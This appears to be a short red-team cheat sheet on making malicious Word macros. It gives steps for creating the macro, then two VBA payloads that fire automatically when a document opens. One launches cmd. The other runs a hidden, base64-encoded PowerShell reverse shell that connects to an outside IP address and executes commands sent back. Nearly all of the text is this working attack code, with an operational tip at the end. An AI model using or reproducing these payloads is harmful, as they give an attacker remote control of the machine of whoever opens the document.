# How to create Macros for MS Office

1. empty document in word and save as 97-2003 doc
2. View - Macros
3. Create and select current document

## CMD

```python

Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "cmd"
  
End Sub
```

## Reverse shell

```python
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()

    Dim Str As String
        
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACcAMQA4ADUALgAyADAAMAAuADIAMgAxAC4"
    Str = Str + "AMQA4ACcALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AI"
    Str = Str + "AAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAA"
    Str = Str + "pADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgA"
    Str = Str + "DAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGU"
    Str = Str + "AKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZ"
    Str = Str + "AAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwA"
    Str = Str + "uAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkA"
    Str = Str + "GQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACA"
    Str = Str + "ALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZ"
    Str = Str + "QB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgB"
    Str = Str + "HAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsA"
    Str = Str + "CAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGk"
    Str = Str + "AZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAd"
    Str = Str + "AAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwB"
    Str = Str + "rADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQA"
    Str = Str + "FMAUgBlAHYAZQByAHMAZQBTAGgAZQBsAGwAIwAgACcAOwAkAHM"
    Str = Str + "AZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAb"
    Str = Str + "gBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB"
    Str = Str + "0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7A"
    Str = Str + "CQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQ"
    Str = Str + "AYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZ"
    Str = Str + "QBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwB"
    Str = Str + "oACgAKQB9ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApA"
    Str = Str + "DsA"

    CreateObject("Wscript.Shell").Run Str
    
End Sub

```

* Always create a new .doc, don't reuse the old ones